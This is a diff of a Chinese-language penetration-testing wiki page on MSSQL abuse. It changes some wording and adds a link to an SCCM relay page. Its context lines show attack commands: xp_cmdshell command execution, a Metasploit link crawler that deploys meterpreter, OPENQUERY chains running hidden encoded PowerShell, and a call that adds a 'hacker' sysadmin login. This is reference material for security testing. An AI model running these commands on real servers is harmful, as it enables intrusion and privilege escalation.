@@ -161,7 +161,7 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-在MSSQL主机内部**执行命令**也可能是可行的。
+在MSSQL主机内**执行命令**也可能是可行的。
 ```bash
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
@@ -220,13 +220,13 @@ inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:
 ```
 ### Metasploit
 
-您可以使用 metasploit 轻松检查受信任的链接。
+您可以使用metasploit轻松检查受信任的链接。
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-注意，metasploit 只会尝试滥用 MSSQL 中的 `openquery()` 函数（因此，如果您无法使用 `openquery()` 执行命令，您将需要尝试 **手动** 使用 `EXECUTE` 方法来执行命令，详见下文。）
+注意，metasploit 只会尝试滥用 MSSQL 中的 `openquery()` 函数（因此，如果您无法使用 `openquery()` 执行命令，您需要尝试 **手动** 使用 `EXECUTE` 方法来执行命令，更多信息见下文。）
 
 ### 手动 - Openquery()
 
@@ -256,7 +256,7 @@ select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 
 ![](<../../images/image (643).png>)
 
-您可以手动无限期地继续这些受信任链接的链。
+您可以手动无限制地继续这些受信任链接的链。
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -282,5 +282,12 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 [SweetPotato](https://github.com/CCob/SweetPotato) 收集了这些可以通过 Beacon 的 `execute-assembly` 命令执行的各种技术。
 
+
+
+### SCCM 管理点 NTLM 中继 (OSD 秘密提取)
+查看 SCCM **管理点** 的默认 SQL 角色如何被滥用，以直接从站点数据库中转储网络访问账户和任务序列秘密：
+{{#ref}}
+sccm-management-point-relay-sql-policy-secrets.md
+{{#endref}}
 
 {{#include ../../banners/hacktricks-training.md}}
